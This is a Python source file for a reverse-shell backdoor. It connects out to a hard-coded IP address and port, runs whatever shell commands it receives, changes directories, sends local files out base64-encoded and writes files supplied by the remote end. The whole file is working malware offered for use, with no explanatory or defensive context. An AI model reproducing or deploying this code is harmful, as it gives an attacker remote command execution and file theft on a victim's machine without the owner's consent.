import socket
from subprocess import check_output as execute_check_output
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    def recieve_command(self):
        return self.my_connection.recv(65536).decode("utf-8").split()

    def send_data(self, data_to_send):
        self.my_connection.send(data_to_send)

    def execute_command(self, command):
        try:
            return execute_check_output(" ".join(command), shell=True)
        except:
            return b"Command error!"

    def directory_command(self, path):
        os.chdir(path)
        return execute_check_output("pwd", shell=True)
    
    def download_command(self, path):
        try:
            with open(path, "rb") as tf:
                return base64.b64encode(tf.read())
        except:
            return b"Error"
    
    def upload_command(self, path, content):
        try:
            with open(path, "wb") as tf:
                tf.write(base64.b64decode(content))
                return b"Uploaded Successfully!"
        except:
            return b"Error"
        
    def start_connection(self):
        while True:
            command = self.recieve_command()
            try:
                if command[0] == "quit":
                    self.stop_connection()
                    break
                if command[0] == "cd":
                    command_output = self.directory_command(command[1])
                elif command[0] == "download":
                    command_output = self.download_command(command[1])
                elif command[0] == "upload":
                    command_output = self.upload_command(command[1], command[2])
                else:
                    command_output = self.execute_command(command)
            except Exception as e:
                pass
            self.send_data(command_output)

    def stop_connection(self):
        self.my_connection.close()

my_ip = "192.168.1.52"
my_port = 1234
conn = Backdoor(my_ip, my_port)
conn.start_connection()
